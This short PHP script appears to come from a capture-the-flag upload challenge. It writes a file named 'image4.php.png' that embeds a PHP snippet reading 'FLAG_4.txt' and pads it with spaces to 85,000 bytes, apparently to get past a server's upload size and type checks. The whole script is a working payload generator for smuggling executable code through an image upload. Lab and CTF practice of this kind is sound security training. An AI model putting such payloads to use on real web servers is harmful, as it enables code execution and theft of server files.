<?php
$content = "12345678<?php readfile('FLAG_4.txt') ?>";

// Server limitindən böyük ölçü (85 KB)
$targetSize = 85000;

$currentSize = strlen($content);

if ($currentSize < $targetSize) {
    $fillSize = $targetSize - $currentSize;
    $fillContent = str_repeat(' ', $fillSize);

    file_put_contents('image4.php.png', $content . $fillContent);
}
?>

